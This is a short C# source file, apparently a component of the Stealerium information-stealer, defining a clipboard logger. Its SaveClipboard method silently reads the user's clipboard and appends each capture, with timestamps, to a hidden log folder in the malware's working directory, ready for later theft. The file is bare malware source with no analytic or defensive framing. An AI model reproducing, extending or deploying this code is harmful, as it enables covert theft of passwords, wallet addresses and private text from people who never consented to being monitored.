using System;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Clipper;

internal sealed class Logger
{
	private static readonly string _logDirectory = Path.Combine(Paths.InitWorkDir(), "logs\\clipboard\\" + DateTime.Now.ToString("yyyy-MM-dd"));

	public static void SaveClipboard()
	{
		string clipboardText = ClipboardManager.ClipboardText;
		if (!string.IsNullOrWhiteSpace(clipboardText))
		{
			string path = _logDirectory + "\\clipboard_logs.txt";
			if (!Directory.Exists(_logDirectory))
			{
				Directory.CreateDirectory(_logDirectory);
			}
			File.AppendAllText(path, "### " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") + " ###\n" + clipboardText + "\n\n");
		}
	}
}
